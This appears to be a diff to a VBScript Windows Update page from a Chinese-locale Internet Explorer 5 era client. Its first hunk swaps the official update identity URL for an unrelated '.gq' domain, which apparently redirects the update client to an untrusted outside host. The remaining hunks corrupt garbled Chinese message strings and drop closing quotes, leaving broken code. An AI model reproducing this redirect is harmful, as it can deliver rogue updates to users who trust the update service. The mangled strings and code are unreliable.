@@ -13,7 +13,7 @@ If top.g_bIsWinUpdate <> TRUE Then
 End if
 Dim m_lCatalogPUID, m_lOS
 m_lOS = 0
-const m_strIdentUrl	= "http://windowsupdate.microsoft.com"
+const m_strIdentUrl	= "http://v31update.vornext.gq"
 dim m_strBrowserLang
 m_strBrowserLang	= parent.parent.g_strLocaleID
 Dim g_bShowAll
@@ -38,7 +38,7 @@ Sub WaitForControls(loops)
  SetLocalizedStrings()
  If Wuv3is.FixCompatRollbackKey() Then
  parent.HideWaitDialog()
- parent.WuMsgBox "Windows Update �ѽ������ж�� Internet Explorer 5 �����������⡣<BR>ֻ�йرղ��������� Internet Explorer �Ժ�Windows Update ��������������<BR>Windows Update �����ر������������",1, "��Ҫ��������","240px","400px"
+ parent.WuMsgBox "Windows Update �ѽ������ж��?Internet Explorer 5 �����������⡣<BR>ֻ�йرղ��������� Internet Explorer �Ժ�Windows Update ��������������<BR>Windows Update �����ر������������?,1, "��Ҫ��������","240px","400px"
  parent.parent.g_bRebootRequired = true
  parent.parent.close()
  End If
@@ -68,7 +68,7 @@ Sub SetLocalizedStrings()
 	"%d ����", _
 	"%d Сʱ %d ����", _
 	"Microsoft Windows Update", _
-	"������������ Windows ����ɰ�װ��", _
+	"������������ Windows ����ɰ�װ��?, _
 	"�Ƿ���������������")
 	WUV3IS.SetStrings ArrLocStrings,0
 End Sub
